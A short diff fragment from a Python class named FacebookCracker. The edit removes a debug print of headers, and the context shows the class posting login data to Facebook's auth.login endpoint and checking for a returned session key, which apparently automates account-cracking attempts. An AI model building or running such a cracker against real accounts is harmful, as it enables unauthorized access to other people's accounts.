@@ -103,7 +103,6 @@ class FacebookCracker:
                 'currently_logged_in_userid': '0', 
                 'fb_api_req_friendly_name': 'authenticate'
             }
-            print(headers)
             try:
                 response = requests.post('https://api.facebook.com/method/auth.login', data=data, headers=headers).json()
                 if 'session_key' in response:
